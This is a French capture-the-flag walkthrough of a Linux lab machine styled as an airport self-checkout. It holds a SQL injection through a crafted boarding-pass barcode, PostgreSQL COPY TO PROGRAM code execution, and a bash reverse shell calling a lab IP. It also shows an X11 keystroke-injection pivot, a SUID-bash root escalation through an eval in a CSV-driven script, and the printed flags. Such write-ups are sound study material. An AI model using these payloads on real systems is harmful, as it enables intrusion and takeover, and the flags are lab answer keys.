Medium, Linux
- - -
# User flag

## Reconnaissance
```bash
$ nmap 10.129.231.23 -sCV

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=airsnacks.htb
|_http-title: Welcome \xC2\xB7 AirSnacks Self-Checkout
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
On ajoute `airsnacks.htb` (HTTP + HTTPS) au `/etc/hosts`. Le site est un **self-checkout de snacks d'aéroport** : on remplit un panier, et pour « sortir » du magasin il faut scanner une carte d'embarquement.

On énumère avec `ffuf`/`dirb` + `nuclei` (en passant un cookie de session d'achat) :
```
/browse                                       # choix des snacks
/cart  /cart/add  /cart/update  /cart/clear   # panier (POST)
/checkout/boarding-pass  /checkout/boarding-pass/verify
/exit                                         # logout (vide la session)
/health                                       # {"status":"ok"}
```

> **Concept — le cookie de session Flask.** La valeur `session=...` est faite de 3 parties séparées par des points : `payload.timestamp.signature` (format `itsdangerous`). Le payload est du JSON **encodé** en base64 (pas chiffré → lisible), parfois **compressé** zlib, signalé par un `.` en tête. La signature est un HMAC calculé avec le `SECRET_KEY` de l'app. Conséquence : on peut **lire** le contenu, mais pas le **modifier** sans connaître le secret.

On décode donc le cookie (lecture seule). Après un scan, le serveur y stocke l'éligibilité :
```json
{ "cart": {"WIN-SLV-750": 1}, "cart_id": "c_4b...",
  "eligibility": {"regime": "OFF_AIRPORT", "exempt": false, "dest": "HTB", "audit_ref": "aud_..."} }
```
On tente de casser les deux secrets (JWT d'éligibilité **et** `SECRET_KEY` Flask) avec `rockyou` → **rien** : les secrets sont forts, pas de forge possible. `nuclei` ne sort rien non plus.

## Le format BCBP (carte d'embarquement)
Le bouton de scan appelle `initScanner()` (cf. [scanner.js](scanner.js.md)) : un POST sur `/checkout/boarding-pass/verify` avec `{"raw": "<carte>"}`. Envoyé vide :
```json
{"detail":"expected 'M' at offset 0","error":"BCBP_ERR_FORMAT_CODE","item":1}
```

> **Concept — BCBP / IATA Resolution 792.** C'est le format standard encodé dans le code-barres d'une carte d'embarquement. Il se lit **par position fixe** : une partie *mandatory* (60 octets : nom, PNR, aéroports départ/arrivée, compagnie, vol, date, siège, séquence…), puis une section *conditionnelle* qui commence par `>`. Chaque champ a un **numéro d'item IATA** (d'où les erreurs `item:N`). Trois champs sont des **longueurs en hexadécimal** qui disent au parser combien d'octets lire ensuite : `item6` (taille totale du conditionnel), `item10` (taille du bloc « unique »), `item17` (taille du bloc « répété » par segment). C'est en respectant ces longueurs qu'on fabrique une carte valide.

On craft le pass en corrigeant une à une les erreurs renvoyées (le parser indique précisément quel item échoue) :
```
M1DOE/JOHN            EABC123 CDGHTBAF 0123 365Y012A0001 114>60B1WW6319BAF 03057
```
Décomposition du conditionnel `>60B1WW6319BAF 03057` : `>` (début) · `6` (version) · `0B`=`item10`=11 (bloc unique) · `1WW6319BAF ` (bloc unique) · `03`=`item17`=3 (bloc répété) · `057` (bloc répété).

Le serveur répond un `eligibility_token` (JWT) : `regime:"OFF_AIRPORT"`, `exempt:false`.

> **Fausse piste.** On croit devoir forcer `exempt:true` (détaxe). Mais les secrets sont forts (pas de forge), **aucun** champ du pass ne change `exempt`, et `/exit` ne fait que déconnecter. Le vrai indice : chaque scan renvoie un `audit_ref` → **le pass est journalisé en base de données**.

## SQLi dans le champ « airline-use »
Le bloc répété du conditionnel se termine par un champ texte **libre** : *for individual airline use* (item 4). C'est le seul champ non contraint → candidat parfait. On y glisse une simple quote (en recalculant `item6`) :
```
M1DOE/JOHN            EABC123 CDGHTBAF 0123 365Y012A0001 115>60B1WW6319BAF 03057'
```
Réponse — une **erreur PostgreSQL verbeuse** qui fuit la requête :
```json
{"detail":"unterminated quoted string at or near \"''')\"\nLINE 1: ...E/JOHN', 'AF', '0123', '365', 'CDG', 'HTB', '', '', 81, ''')","error":"DCS_ERR_INTERNAL"}
```
Notre valeur est le **dernier champ string** d'un `INSERT` d'audit (`record_export_evidence`) construit par **interpolation `%` Python** dans un littéral entre quotes → injectable.

> **Concept — extraction error-based.** Pas de sortie directe ? On force une **erreur de type** qui recrache la donnée. `cast(current_user as int)` demande à PostgreSQL de convertir le nom du rôle (texte) en entier → impossible → l'erreur contient le nom.

```bash
# fuite du rôle
...BAF 03057'||cast(current_user as int)||'
# -> invalid input syntax for integer: "airsnacks_app"

# le rôle est-il membre de pg_execute_server_program ?
...BAF 03057'||cast((select string_agg(rolname,',') from pg_roles
   where rolname in ('pg_execute_server_program')
   and pg_has_role(current_user,oid,'MEMBER')) as int)||'
# -> renvoie bien pg_execute_server_program
```

> **Concept — `COPY ... TO PROGRAM`.** `COPY` sert normalement à importer/exporter des fichiers côté serveur. La variante `TO PROGRAM 'cmd'` **passe le résultat à une commande shell** exécutée par l'utilisateur système `postgres` → RCE. C'est réservé aux superusers **ou** aux membres du rôle `pg_execute_server_program` (notre cas). On l'enchaîne en **stacked query** (plusieurs requêtes dans un même `execute()`, autorisé par `psycopg2`). Astuces : `$$ ... $$` (dollar-quoting) évite de jongler avec les quotes ; on **ferme la quote + la parenthèse** de l'`INSERT` avant le `;`, et on commente la fin avec `-- `.

```bash
# 1) preuve d'exécution sans réseau : la réponse doit mettre ~5 s
...BAF 03057'); COPY (SELECT 1) TO PROGRAM $$ sleep 5 $$; -- 

# 2) reverse shell (base64 pour éviter toute quote imbriquée). Kali : nc -lvnp 443
...BAF 03057'); COPY (SELECT 1) TO PROGRAM $$ echo <b64(bash -i >& /dev/tcp/10.10.14.158/443 0>&1)> | base64 -d | /bin/bash $$; -- 
```
=> **shell en tant que `postgres`**.

Tout le craft (reconstruction du pass + recalcul des longueurs hex) est automatisé dans [bcbp_sqli.py](bcbp_sqli.py). Cœur du script :
```python
MAND   = "M1DOE/JOHN            EABC123 CDGHTBAF 0123 365Y012A0001 1"
UNIQUE = "1WW6319BAF "        # bloc unique, 11 octets  -> item10 = 0B
REP    = "057"                # bloc répété, 3 octets   -> item17 = 03
def craft(airline_use=""):
    cond = ">6" + f"{len(UNIQUE):02X}" + UNIQUE + f"{len(REP):02X}" + REP + airline_use
    return MAND + f"{len(cond):02X}" + cond   # item6 = longueur du conditionnel
```

```bash
C='session=eyJjYXJ0Ijp7IldJTi1TTFYtNzUwIjoxfSwiY2FydF9pZCI6ImNfNGI2MDA2MzZhYyJ9.avmWEg.0PCoT9NOW5PbLbQqIh8lN0YyeZo'
python3 bcbp_sqli.py --target https://airsnacks.htb --cookie "$C" --sql "'"            # test
python3 bcbp_sqli.py --target https://airsnacks.htb --cookie "$C" --sleeptest 5         # exécution
python3 bcbp_sqli.py --target https://airsnacks.htb --cookie "$C" --rce --lhost 10.10.14.158 --lport 443
```

## Pivot postgres → dutyfree-kiosk (X11 / XTEST)

> **Concept — X11 n'isole pas ses clients.** N'importe quel processus qui peut se connecter au serveur X d'un display peut lire l'écran **et injecter des événements clavier/souris** via l'extension **XTEST**, comme si l'utilisateur tapait. Ici l'utilisateur `dutyfree-kiosk` est loggé dans une session **Openbox** sur `:0`, et `/etc/xdg/openbox/rc.xml` mappe **`Ctrl+Alt+T` → `xterm`**. En simulant ce raccourci, Openbox lance un `xterm` **sous l'identité `dutyfree-kiosk`** (son WM est le parent), dans lequel on tape un reverse shell.

Recon depuis `postgres` (commandes moins courantes commentées) :
```bash
w ; who                                             # qui est loggé, sur quel display
ls -la /tmp/.X11-unix/                              # socket du display (X0 = :0)
cat /proc/$(pgrep -f '[X]org')/cmdline|tr '\0' ' '  # ligne de cmd du serveur X -> arg -auth
export DISPLAY=:0
xdpyinfo >/dev/null 2>&1 && echo "connexion X OK"   # teste l'accès au display
```
Le contrôle d'accès du serveur X étant permissif pour la borne, on se connecte sans cookie (sinon il faut pointer `XAUTHORITY` sur le `.Xauthority` indiqué par `-auth`).

On uploade [xtest_pivot.py](xtest_pivot.py) via un serveur HTTP (`python3 -m http.server` côté Kali, `wget` côté box), on ouvre un listener (`nc -lvnp 443`), puis on lance le script. Cœur de l'injection :
```python
from Xlib import display, X
from Xlib.ext import xtest
d = display.Display()                             # lit DISPLAY/XAUTHORITY de l'env
# Ctrl+Alt+T -> xterm (en tant que dutyfree-kiosk)
for k in (0xffe3, 0xffe9, ord('t')):              # Control_L, Alt_L, t
    xtest.fake_input(d, X.KeyPress, d.keysym_to_keycode(k)); d.sync()
# ... relâche les touches, attend, puis "tape" le reverse shell + Return
```
```bash
python3 xtest_pivot.py 10.10.14.158 443
```
=> **shell en tant que `dutyfree-kiosk`**.

> Si `python3-xlib` manque sur la box : mêmes 3 étapes avec `xdotool` (`xdotool key ctrl+alt+t` / `xdotool type '<revshell>'` / `xdotool key Return`) ou `xte`.

**User flag** (`/home/dutyfree-kiosk/user.txt`) :
```
2976e2705e1483904fa3eb6a3cd6652b
```

# Root flag

> **Concept — unit systemd `.path`.** Une unit `.path` surveille un fichier/dossier et déclenche automatiquement une unit `.service` dès qu'il est modifié. Si ce service tourne en **root** et traite un fichier que **nous** pouvons écrire, on a une élévation de privilèges.

```bash
$ id
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)

$ ls -lR / 2>/dev/null | grep pos-ops 2>/dev/null
drwxrwxr-x 2 root pos-ops 4096 Oct 20 12:01 data
-rw-rw-r-- 1 root pos-ops 97   Aug 26 14:21 duty-rates.csv
# root owned, pos-ops writable

$ find / -name duty-rates.csv 2>/dev/null
/opt/vrs/data/duty-rates.csv

$ cat /opt/vrs/data/duty-rates.csv
SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
# Un CSV classique pour l'instant

# Est-ce que le fichier est surveillé ?
# -r : Recherche récursive
# -l : Affiche uniquement le nom du fichier, pas la correspondance
$ grep -rl 'duty-rates.csv' /etc /lib /usr/lib /opt 2>/dev/null
/etc/systemd/system/vrs-duty-apply.path
/opt/vrs/bin/vrs-dcs-sync.cron
/opt/vrs/bin/apply-duty-rates.sh   # /!\ Fichier Bash

$ ls -l /opt/vrs/bin/apply-duty-rates.sh
-rwxr-xr-x 1 root root 944 Aug 28 09:02 /opt/vrs/bin/apply-duty-rates.sh
# Sera exécuté par root, à chaque changement du CSV (voir /etc/systemd/system/vrs-duty-apply.path)
```

Le contenu du fichier bash est [ici](apply-duty-rates.sh).
Ligne 23, on a :

```bash
eval "${tax_class}=${duty_pct}"
```

Avec `tax_class` et `duty_pct` étant des colonnes du CSV que l'on peut modifier. En injectant alors la ligne suivante, on peut s'ouvrir un shell depuis la session `root`, et finaliser notre LPE :

```bash
# Single quote pour que ce soit le bash root qui l'exécute
# chmod u+s : ajoute le bit SUID, pour que le fichier se lance avec la session root
$ echo 'chmod u+s /bin/bash;x,0,0' >> /opt/vrs/data/duty-rates.csv

$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
   ^ bit SUID (s)

# -p : Permissif, ne demande pas de mdp
$ /bin/bash -p
# id
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) euid=0(root) groups=1000(dutyfree-kiosk),1001(pos-ops)

# cat /root/root.txt
fcc3bb4ca58f5faa8d6255d2b1541b9b
```



- - -
# Déroulé du raisonnement (schéma)

```
 RECON ──► nmap : 22 (ssh) / 80 / 443 ; vhost airsnacks.htb
   │        = self-checkout de snacks d'aéroport
   ▼
 WEB ────► énum endpoints + cookie Flask signé
   │        (lisible en base64, mais NON forgeable : secrets forts)
   ▼
 BCBP ───► /checkout/boarding-pass/verify attend une carte IATA-792
   │        craft d'un pass valide — les erreurs "item:N" guident
   │
   │   ✗ FAUSSE PISTE : forcer exempt:true
   │     secrets forts · aucun champ ne bouge · /exit = logout
   │     └─► vrai indice : audit_ref ⇒ le pass est journalisé en DB
   ▼
 SQLi ───► champ "airline-use" ⇒ INSERT d'audit (interpolation %)
   │        '            → erreur PostgreSQL verbeuse (fuite requête)
   │        cast(... int) → rôle = airsnacks_app
   │        rôle ∈ pg_execute_server_program
   ▼
 RCE ────► COPY (SELECT 1) TO PROGRAM → reverse shell  ══►  [ postgres ]
   │
   │   X11 sans isolation : dutyfree-kiosk loggé sur :0 (Openbox)
   ▼
 PIVOT ──► XTEST : Ctrl+Alt+T → xterm (sous le kiosk)  ══►  [ dutyfree-kiosk ]
   │        puis reverse shell                               └─► user.txt
   │
   │   groupe pos-ops → /opt/vrs/data/duty-rates.csv (root, g+w)
   │   surveillé par vrs-duty-apply.path → .service (root)
   │   eval "${tax_class}=${duty_pct}"  NON filtré
   ▼
 LPE ────► inject ';' : chmod u+s /bin/bash ; x=0      ══►  [ root ]
            puis  /bin/bash -p                               └─► root.txt
```
